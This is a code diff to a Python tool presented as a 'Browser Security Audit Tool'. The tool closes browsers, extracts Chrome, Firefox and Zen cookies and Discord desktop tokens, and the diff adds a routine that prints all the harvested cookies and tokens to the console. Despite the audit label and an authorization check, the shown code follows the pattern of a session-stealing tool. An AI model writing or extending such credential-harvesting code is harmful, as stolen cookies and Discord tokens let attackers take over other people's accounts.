@@ -222,25 +222,58 @@ class BrowserAudit:
         if found_any:
             print("[OK] Discord tokens extracted\n")
 
+    def display_results(self):
+        print("\n[===========================================]")
+        print("    EXTRACTED DATA")
+        print("[===========================================]\n")
+
+        files_to_display = [
+            ("chrome_cookies.txt", "Chrome Cookies"),
+            ("firefox_cookies.txt", "Firefox Cookies"),
+            ("zen_cookies.txt", "Zen Cookies"),
+            ("discord_tokens.txt", "Discord Desktop Tokens"),
+        ]
+
+        for filename, title in files_to_display:
+            filepath = self.cookies_dir / filename
+            if filepath.exists():
+                print(f"\n[{title}]")
+                print("-" * 50)
+                try:
+                    with open(filepath, 'r') as f:
+                        content = f.read().strip()
+                        if content:
+                            print(content)
+                        else:
+                            print("(no data found)")
+                except Exception as e:
+                    print(f"Error reading {filename}: {e}")
+            else:
+                print(f"\n[{title}]")
+                print("-" * 50)
+                print("(no data found)")
+
     def run(self):
         print("\n[===========================================]")
         print("    Browser Security Audit Tool")
         print("[===========================================]\n")
-        
+
         self.check_authorization()
         self.close_browsers()
-        
+
         self.log("INFO", "Audit started")
-        
+
         self.extract_chrome_cookies()
         self.extract_firefox_cookies()
         self.extract_zen_cookies()
         self.extract_discord_tokens()
-        
+
+        self.display_results()
+
         print("\n[===========================================]")
         print(f"Output: {self.audit_dir}")
         print("[===========================================]\n")
-        
+
         self.log("INFO", "Audit completed successfully")
 
 def main():
